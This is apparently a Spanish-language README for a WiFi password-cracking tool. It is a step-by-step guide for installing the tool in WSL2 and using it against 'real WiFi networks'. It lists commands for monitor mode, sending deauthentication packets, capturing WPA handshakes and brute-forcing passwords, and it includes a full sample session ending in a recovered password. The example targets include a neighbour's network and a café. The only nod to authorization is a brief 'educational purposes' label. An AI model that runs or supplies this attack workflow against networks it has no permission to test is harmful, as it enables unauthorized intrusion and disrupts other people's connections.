# WiFi-BF - Setup de WSL2 Completo

Guía paso a paso para instalar y configurar WiFi-BF en WSL2 para atacar redes WiFi reales.

---

## Tabla de contenidos

1. [Requisitos previos](#requisitos-previos)
2. [Instalación en WSL2](#instalación-en-wsl2)
3. [Configuración de interfaz WiFi](#configuración-de-interfaz-wifi)
4. [Verificación de instalación](#verificación-de-instalación)
5. [Uso operacional](#uso-operacional)
6. [Troubleshooting](#troubleshooting)

---

## Requisitos previos

- Windows 10/11 con WSL2 habilitado
- Distribución Linux en WSL2 (Ubuntu 20.04 LTS recomendado)
- Adaptador WiFi USB compatible con modo monitor (ver [Hardware compatible](#hardware-compatible))
- Terminal con permisos administrativos
- Al menos 2 GB de espacio libre

### Hardware compatible

Adaptadores WiFi recomendados para modo monitor:

- TP-Link TL-WN722N
- TP-Link TL-WN722N v3
- ALFA AWUS036NHA
- ALFA AWUS036NH
- Ralink RT3070
- Atheros AR9271

Ver lista completa: https://www.aircrack-ng.org/doku.php?id=compatible_cards

---

## Instalación en WSL2

### Paso 1: Habilitar WSL2 (si no está habilitado)

En PowerShell (como Administrador):

```powershell
wsl --install
wsl --set-default-version 2
```

### Paso 2: Instalar Ubuntu en WSL2

```powershell
wsl --install -d Ubuntu-20.04
```

### Paso 3: Inicializar Ubuntu y crear usuario

```bash
# Se abrirá Ubuntu automáticamente
# Crea un nombre de usuario y contraseña
username@pc:~$
```

### Paso 4: Clonar WiFi-BF

```bash
sudo apt-get update
sudo apt-get install -y git

git clone https://github.com/ozkar-co/wifi-bf.git
cd wifi-bf
```

### Paso 5: Ejecutar script de instalación

```bash
sudo bash setup_linux.sh
```

Este script:
- Actualiza lista de paquetes
- Instala aircrack-ng y dependencias
- Instala librerías Python necesarias
- Verifica que todo esté correctamente instalado

### Paso 6: Verificar instalación

```bash
python3 wifi_bf.py --help
```

Deberías ver el mensaje de ayuda sin errores.

---

## Configuración de interfaz WiFi

### Identificar interfaz WiFi disponible

Dentro de WSL2:

```bash
iwconfig
```

Deberías ver algo como:

```
wlan0     IEEE 802.11bgn  ESSID:off/any
          Mode:Managed  Frequency:2.412 GHz  Access Point: NOT-ASSOCIATED
          ...
```

O:

```
wlo1      IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: NOT-ASSOCIATED
```

### Configurar interfaz en config.py

Edita `config.py`:

```python
# Línea ~47
WLAN_INTERFACE = "wlan0"  # Cambiar según tu caso (wlan0, wlan1, wlo1, etc)
```

---

## Verificación de instalación

Ejecuta el siguiente comando para verificar que todo está listo:

```bash
sudo python3 wifi_bf.py -i wlan0 --scan
```

**Salida esperada:**

```
[2026-02-27 14:30:15] INFO - root - Modo monitor habilitado: wlan0mon
[2026-02-27 14:30:20] INFO - root - Escaneando redes durante 15 segundos...

================================================================================
REDES ENCONTRADAS
================================================================================
Num   ESSID                         BSSID                Power      Encrypt   
--------------------------------------------------------------------------------
1     Mi Red                        AA:BB:CC:DD:EE:FF    -45        WPA2      
2     Red Vecino                    11:22:33:44:55:66    -65        WPA2      
3     Cafeteria                     FF:EE:DD:CC:BB:AA    -72        WPA       
================================================================================
```

---

## Uso operacional

### Paso 1: Listar redes disponibles

```bash
sudo python3 wifi_bf.py -i wlan0 --scan
```

Toma nota del ESSID y BSSID de la red objetivo.

### Paso 2: Atacar red específica

```bash
sudo python3 wifi_bf.py -i wlan0 --attack "Mi Red" "AA:BB:CC:DD:EE:FF" --threads 4
```

El programa:
1. Habilitará monitor mode
2. Capturará el handshake WPA
3. Probará contraseñas usando fuerza bruta
4. Reportará éxito o fallo

### Paso 3: Revisar reportes

Los reportes se guardan en:

```bash
ls logs/reports/
cat logs/reports/report_brute-force_20260227_143215.txt
```

---

## Troubleshooting

### Problema: "Operation not permitted" (Permisos)

**Síntoma:**
```
OSError: [Errno 1] Operation not permitted
```

**Solución:**
```bash
# Ejecutar siempre con sudo
sudo python3 wifi_bf.py -i wlan0 --scan
```

---

### Problema: "No such device" (Interfaz WiFi)

**Síntoma:**
```
RuntimeError: Interface wlan0 not found
```

**Solución:**
```bash
# Verificar interfaz disponible
iwconfig

# Actualizar config.py con la interfaz correcta
vi config.py
# Cambiar WLAN_INTERFACE = "wlan0" a la interfaz que viste

# O especificar en línea de comandos
sudo python3 wifi_bf.py -i wlan1 --scan
```

---

### Problema: "aircrack-ng: command not found"

**Síntoma:**
```
FileNotFoundError: aircrack-ng no disponible
```

**Solución:**
```bash
# Instalar manualmente
sudo apt-get install -y aircrack-ng

# Verificar instalación
aircrack-ng -h
```

---

### Problema: No se captura el handshake

**Síntomas:**
- Script se queda esperando
- "Timeout capturando handshake"

**Soluciones:**

1. Aumentar timeout:
```bash
# En config.py, línea ~69
CAPTURE_TIMEOUT = 180  # Cambiar de 120 a 180 segundos
```

2. Aumentar deauth packets:
```bash
# En config.py, línea ~66
DEAUTH_PACKETS = 20  # Cambiar de 10 a 20
```

3. Asegurar clients conectados:
```bash
# El handshake requiere que haya clientes conectados a la red
# Si no hay, el script puede no capturarlo
```

---

### Problema: Interfaz en modo monitor no se habilita

**Síntoma:**
```
Error habilitando modo monitor
```

**Soluciones:**

1. Verificar compatibilidad:
```bash
sudo airmon-ng check
```

2. Matar procesos que interfieren:
```bash
sudo airmon-ng check kill
```

3. Intentar manualmente:
```bash
sudo airmon-ng start wlan0
iwconfig  # Verificar wlan0mon aparece
```

---

### Problema: WSL2 no accede a USB WiFi

**Síntoma:**
```
iwconfig  # No muestra interfaz USB
```

**Soluciones:**

Para acceder a puertos USB en WSL2, necesitas usar usbipd:

```powershell
# En PowerShell como Administrador:

# Listar dispositivos USB
usbipd list

# Buscar tu adaptador WiFi y anotar el bus ID (ej: 2-4)
# Adjuntarlo a WSL2
usbipd attach --wsl --busid 2-4

# En WSL2:
lsusb  # Verificar que aparece el dispositivo
```

---

### Problema: Script es muy lento

**Síntoma:**
- Menos de 10 intentos por segundo
- Esperando mucho por handshake

**Soluciones:**

1. Aumentar hilos:
```bash
sudo python3 wifi_bf.py -i wlan0 --attack "Red" "MAC" --threads 8
```

2. Usar diccionario en lugar de fuerza bruta:
```bash
# Próximamente en versión dictionary
```

3. Acortar rango de búsqueda:
```bash
sudo python3 wifi_bf.py -i wlan0 --attack "Red" "MAC" \
    --min-length 8 --max-length 12
```

---

## Ejemplo de sesión completa

```bash
# 1. Entrar a WSL2
wsl -d Ubuntu-20.04

# 2. Navegar a directorio
cd ~/wifi-bf

# 3. Listar redes
sudo python3 wifi_bf.py -i wlan0 --scan

# Salida:
# Num   ESSID                         BSSID                Power      Encrypt   
# 1     MiRedTest                     AA:BB:CC:DD:EE:FF    -35        WPA2      

# 4. Atacar la red
sudo python3 wifi_bf.py -i wlan0 \
    --attack "MiRedTest" "AA:BB:CC:DD:EE:FF" \
    --threads 4 \
    --min-length 8 \
    --max-length 20

# Salida:
# [INFO] Iniciando captura para MiRedTest (AA:BB:CC:DD:EE:FF)
# [INFO] Habilitando modo monitor en wlan0...
# [INFO] Modo monitor habilitado: wlan0mon
# [INFO] Iniciando captura de handshake...
# [INFO] Enviando 10 paquetes de desautenticación...
# [INFO] ¡Handshake capturado exitosamente!
# [INFO] Iniciando ataque con método: brute-force
# Intentos: 50,234 | Velocidad: 245.5 intentos/seg
# ...
# [INFO] Contraseña encontrada!

# 5. Ver resultado
cat logs/reports/report_brute-force_*.txt
```

---

## Próximos pasos

- [ ] Implementar método Dictionary
- [ ] Implementar método Heuristic  
- [ ] Agregar soporte para cracking con PMKID
- [ ] Crear panel de dashboard en tiempo real
- [ ] Documentar defensa contra estos ataques

---

## Recursos adicionales

- [Aircrack-ng Documentación](https://www.aircrack-ng.org/)
- [WSL2 Documentación Microsoft](https://docs.microsoft.com/es-es/windows/wsl/)
- [WPA/WPA2 Specifications](https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access)
- [OWASP Wireless Testing](https://owasp.org/www-community/attacks/Wireless_Security)

---

**Última actualización:** Febrero 2026
**Desarrollado con fines educativos**
